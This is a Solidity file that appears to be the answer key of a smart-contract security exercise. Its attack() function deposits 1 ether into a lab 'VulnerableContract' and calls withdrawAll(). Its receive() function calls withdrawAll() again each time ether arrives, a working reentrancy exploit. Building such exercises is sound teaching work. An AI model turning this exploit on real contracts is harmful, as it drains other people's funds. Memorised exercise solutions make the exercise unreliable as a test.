// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import "./shared/AttackerBase.sol";
import "./shared/EventsBase.sol";

contract AttackerSolution is AttackerBase, EventsBase {
  uint256 private constant _ATTACK_AMOUNT = 1 ether;

  constructor(address _vulnerableContractAddress)
    public
    payable
    AttackerBase(_vulnerableContractAddress)
  {}

  function attack() external override {
    // Helpful for debugging
    emit AttackerContractBalance(address(this).balance / 1 ether);

    // INSERT LOGIC HERE: START
    vulnerableContract.deposit{value: _ATTACK_AMOUNT}();
    vulnerableContract.withdrawAll();
    // INSERT LOGIC HERE: END

    // Helpful for debugging
    emit AttackerContractBalance(address(this).balance / 1 ether);
    emit VulnerableContractBalance(address(vulnerableContract).balance / 1 ether);
  }

  // Function is executed when VulnerableContract sends eth.
  receive() external payable override {
    // Helpful for debugging
    emit AttackerContractBalance(address(this).balance / 1 ether);

    // INSERT LOGIC HERE: START
      vulnerableContract.withdrawAll();
    // INSERT LOGIC HERE: END
  }

}
